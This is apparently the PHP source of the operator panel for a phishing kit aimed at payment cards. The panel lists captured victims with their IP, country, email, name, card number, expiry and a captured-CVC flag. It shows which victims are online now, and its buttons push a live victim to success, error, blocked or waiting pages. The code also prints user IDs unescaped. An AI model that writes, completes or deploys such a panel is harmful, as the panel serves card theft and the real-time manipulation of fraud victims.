<?php
session_start();

if (!isset($_SESSION['admin_loggedin']) || $_SESSION['admin_loggedin'] !== true) {
    header("Location: login.php");
    exit;
}

$db_file = 'data/users.db';
$users = file_exists($db_file) ? json_decode(file_get_contents($db_file), true) : [];

// Sort by latest first
uasort($users, function($a, $b) {
    return ($b['last_seen'] ?? 0) <=> ($a['last_seen'] ?? 0);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: #f5f5f5;
            padding: 20px;
        }
        
        .dashboard {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        h1 {
            margin-bottom: 20px;
            color: #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .stats {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .stat-box {
            flex: 1;
            min-width: 150px;
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-box h3 {
            font-size: 24px;
            color: #333;
        }
        
        .stat-box p {
            color: #666;
            margin-top: 5px;
        }
        
        .users-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .users-table th {
            background: #2c3e50;
            padding: 12px;
            text-align: left;
            font-weight: bold;
            color: white;
            border-bottom: 2px solid #ddd;
        }
        
        .users-table td {
            padding: 10px;
            border-bottom: 1px solid #eee;
            vertical-align: top;
        }
        
        .user-row:hover {
            background: #f9f9f9;
        }
        
        .status-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .status-pending { background: #ffc107; color: #333; }
        .status-loading { background: #17a2b8; color: white; }
        .status-success { background: #28a745; color: white; }
        .status-blocked { background: #dc3545; color: white; }
        .status-error { background: #fd7e14; color: white; }
        .status-waiting_pay { background: #6f42c1; color: white; }
        
        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .action-btn {
            padding: 6px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            font-weight: bold;
            transition: all 0.2s;
            white-space: nowrap;
        }
        
        .action-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        
        .btn-success { background: #28a745; color: white; }
        .btn-error { background: #fd7e14; color: white; }
        .btn-blocked { background: #dc3545; color: white; }
        .btn-waiting { background: #6f42c1; color: white; }
        
        .logout-btn {
            padding: 8px 16px;
            background: #6c757d;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
        }
        
        .online-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #28a745;
            border-radius: 50%;
            margin-right: 5px;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .user-data {
            max-width: 150px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .user-data:hover {
            overflow: visible;
            white-space: normal;
            background: white;
            position: absolute;
            z-index: 100;
            padding: 10px;
            border: 1px solid #ddd;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .refresh-btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            margin-left: 10px;
        }
        
        .user-id {
            font-family: monospace;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="dashboard">
        <h1>
            Admin Dashboard
            <div>
                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
                <a href="logout.php" class="logout-btn">Logout</a>
            </div>
        </h1>
        
        <div class="stats">
            <div class="stat-box">
                <h3><?php echo count($users); ?></h3>
                <p>Total Users</p>
            </div>
            <div class="stat-box">
                <h3><?php 
                    $active = 0;
                    foreach ($users as $user) {
                        if (($user['status'] === 'loading' || $user['status'] === 'pending') && 
                            (time() - $user['last_seen'] < 60)) {
                            $active++;
                        }
                    }
                    echo $active;
                ?></h3>
                <p>Active Now</p>
            </div>
            <div class="stat-box">
                <h3><?php 
                    $loading = count(array_filter($users, fn($u) => $u['status'] === 'loading'));
                    echo $loading;
                ?></h3>
                <p>Waiting</p>
            </div>
            <div class="stat-box">
                <h3><?php 
                    $redirected = count(array_filter($users, fn($u) => !empty($u['redirect_to'])));
                    echo $redirected;
                ?></h3>
                <p>Redirected</p>
            </div>
        </div>
        
        <table class="users-table">
            <thead>
                <tr>
                    <th>User ID</th>
                    <th>IP & Country</th>
                    <th>User Data</th>
                    <th>Card Details</th>
                    <th>Status</th>
                    <th>Time</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($users as $id => $user): 
                    $is_online = (time() - $user['last_seen'] < 60);
                    // Show control buttons for users who are not in final states
                    $show_controls = !in_array($user['status'], ['success', 'blocked']);
                ?>
                <tr class="user-row">
                    <td>
                        <div class="user-id" title="<?php echo $id; ?>">
                            <?php echo substr($id, 0, 20) . '...'; ?>
                        </div>
                    </td>
                    <td>
                        <div><?php echo htmlspecialchars($user['ip'] ?? 'N/A'); ?></div>
                        <small style="color: #666;"><?php echo htmlspecialchars($user['country'] ?? 'Unknown'); ?></small>
                    </td>
                    <td>
                        <div class="user-data" title="Email: <?php echo htmlspecialchars($user['data']['email'] ?? 'N/A'); ?>">
                            <strong>Email:</strong> <?php echo htmlspecialchars($user['data']['email'] ?? 'N/A'); ?><br>
                            <strong>Name:</strong> <?php echo htmlspecialchars($user['data']['name'] ?? 'N/A'); ?>
                        </div>
                    </td>
                    <td>
                        <div class="user-data">
                            <strong>Card:</strong> <?php echo htmlspecialchars($user['data']['card'] ?? '****'); ?><br>
                            <strong>Expiry:</strong> <?php echo htmlspecialchars($user['data']['expiry'] ?? 'N/A'); ?><br>
                            <strong>CVC:</strong> <?php echo htmlspecialchars($user['data']['cvc'] ? '***' : 'N/A'); ?>
                        </div>
                    </td>
                    <td>
                        <span class="status-badge status-<?php echo $user['status']; ?>">
                            <?php echo ucfirst($user['status']); ?>
                        </span>
                        <?php if ($is_online && $show_controls): ?>
                        <div style="font-size: 11px; color: green; margin-top: 3px;">
                            <span class="online-indicator"></span> Online
                        </div>
                        <?php endif; ?>
                    </td>
                    <td>
                        <div>Created: <?php echo date('H:i', $user['created_at']); ?></div>
                        <div>Last: <?php echo date('H:i:s', $user['last_seen']); ?></div>
                        <small style="color: #999;">
                            <?php 
                            $diff = time() - $user['last_seen'];
                            if ($diff < 60) echo 'Just now';
                            elseif ($diff < 3600) echo floor($diff/60) . ' min ago';
                            else echo floor($diff/3600) . ' hour ago';
                            ?>
                        </small>
                    </td>
                    <td>
                        <?php if ($show_controls): ?>
                        <div class="action-buttons">
                            <button class="action-btn btn-success" onclick="sendUserTo('<?php echo $id; ?>', 'success')">
                                ✅ Success
                            </button>
                            <button class="action-btn btn-error" onclick="sendUserTo('<?php echo $id; ?>', 'error')">
                                ⚠️ Error
                            </button>
                            <button class="action-btn btn-blocked" onclick="sendUserTo('<?php echo $id; ?>', 'block')">
                                ❌ Blocked
                            </button>
                            <button class="action-btn btn-waiting" onclick="sendUserTo('<?php echo $id; ?>', 'waiting')">
                                ⏳ Waiting
                            </button>
                        </div>
                        <?php else: ?>
                        <div style="color: #999; font-size: 12px;">
                            Final: <?php echo ucfirst($user['status']); ?>
                            <?php if (!empty($user['redirect_to'])): ?>
                            <br><small>To: <?php echo basename($user['redirect_to']); ?></small>
                            <?php endif; ?>
                        </div>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
                
                <?php if (empty($users)): ?>
                <tr>
                    <td colspan="7" style="text-align: center; padding: 40px; color: #999;">
                        No users found in database
                    </td>
                </tr>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
    
    <script>
    function sendUserTo(userId, action) {
        if (confirm(`Send user to ${action.toUpperCase()}?`)) {
            window.location.href = `action.php?id=${encodeURIComponent(userId)}&decision=${action}`;
        }
    }
    
    // Auto-refresh every 15 seconds
    setInterval(() => {
        if (!document.hidden) {
            location.reload();
        }
    }, 15000);
    </script>
</body>
</html>
